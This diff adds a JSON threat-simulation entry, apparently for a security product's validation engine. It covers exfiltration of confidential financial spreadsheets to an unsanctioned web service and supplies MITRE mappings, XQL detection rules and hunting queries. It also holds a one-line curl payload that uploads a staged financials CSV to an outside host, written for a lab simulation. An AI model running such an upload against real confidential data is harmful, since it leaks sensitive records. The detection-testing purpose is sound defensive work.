@@ -1,0 +1,185 @@
+{
+  "id": "TTP-2026-0179",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-08-28T00:00:00Z",
+    "updated_at": "2026-08-28T00:00:00Z",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "dlp",
+      "saas-exfiltration",
+      "web-upload",
+      "enterprise-dlp",
+      "shadow-it"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "data-exfil",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "windows"
+      ],
+      "estimated_runtime_seconds": 30,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Unsanctioned SaaS Web Upload of Confidential Financial Records",
+    "summary": "An adversary or rogue insider uploads confidential financial spreadsheets containing tax IDs, revenue numbers, and PII to an external unmanaged web service.",
+    "description": "Exfiltration over HTTPS to unsanctioned cloud services bypasses traditional perimeter port filters. Palo Alto Networks Enterprise DLP and Prisma Browser inspect outbound multipart HTTP/S uploads, applying machine learning and regex classifiers to detect confidential corporate spreadsheets.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Corporate Espionage Group",
+        "aliases": [
+          "Data Smuggler"
+        ]
+      }
+    ],
+    "campaigns": [
+      "Shadow SaaS Exfiltration"
+    ],
+    "industries_targeted": [
+      "technology",
+      "financial-services",
+      "healthcare"
+    ],
+    "first_observed": "2018-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1567",
+        "subtechnique_id": "T1567.002",
+        "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1074",
+        "subtechnique_id": "T1074.001",
+        "name": "Data Staged: Local Data Staging",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Network Traffic: Network Traffic Content",
+      "Network Traffic: Network Traffic Flow"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Enterprise DLP inspection enabled on network egress path."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "curl -sk -X POST -F \"file=@/tmp/cortex_dlp_saas/q4_unreleased_financials.csv\" https://httpbin.org/post",
+      "timeout_seconds": 30
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Financial Data Staging",
+        "logic": "preset = xdr_data | filter event_type = 'FILE_WRITE' and action_file_name contains 'financials' and (action_file_path contains '/tmp/' or action_file_path contains 'AppData')",
+        "description": "Financial Data Staging",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1567",
+          "T1074"
+        ]
+      },
+      {
+        "name": "DLP Unsanctioned Web Upload",
+        "logic": "preset = xdr_data | filter event_type = 'NETWORK' and action_process_image_name in ('curl', 'powershell', 'chrome', 'msedge') and action_process_command_line contains 'financials.csv'",
+        "description": "DLP Unsanctioned Web Upload",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1567",
+          "T1074"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "name": "Enterprise DLP Cloud Upload Audit",
+        "query": "dataset = panw_dlp_raw | filter dlp_status in ('BLOCKED', 'ALERT') and file_type in ('CSV', 'XLSX') | comp count() as violations by user_id, destination_domain | filter violations >= 1",
+        "purpose": "hunt"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "rule_id": "CR-DLP-0003",
+        "name": "Financial File Staged Followed by Multipart Upload",
+        "logic": "Sequence: File Write (Financial CSV) -> Network Upload within 180s"
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-FINANCIAL-EGRESS"
+        ],
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter action_process_command_line contains 'q4_unreleased_financials.csv'"
+      },
+      {
+        "module": "cortex-xsiam",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-AN-SAAS-DLP-VIOLATION"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter dst_action_external_hostname contains 'httpbin' or action_process_command_line contains 'financials'"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit 42 - Cloud Threat Report: Sensitive Data Security",
+      "url": "https://unit42.paloaltonetworks.com/cloud-threat-report/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    }
+  ]
+}
